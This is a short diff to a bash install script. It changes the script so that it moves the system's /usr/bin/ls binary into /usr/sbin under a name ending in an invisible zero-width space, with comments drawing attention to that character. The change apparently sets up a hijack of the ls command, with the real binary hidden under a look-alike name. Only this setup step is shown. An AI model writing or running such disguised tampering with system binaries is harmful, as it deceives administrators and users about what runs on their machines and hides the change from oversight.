@@ -1,10 +1,10 @@
 #!/bin/bash
 if [ $# -eq 0 ]; then
     echo "No arguments supplied; assuming first time"
-	mv /usr/bin/ls /usr/bin/lsa
+	mv "/usr/bin/ls" "/usr/sbin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
 else
 	if [ $1 != "--reinstall" ]; then
-		mv /usr/bin/ls /usr/bin/lsa
+		mv "/usr/bin/ls" "/usr/sbin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
 	fi
 fi
 
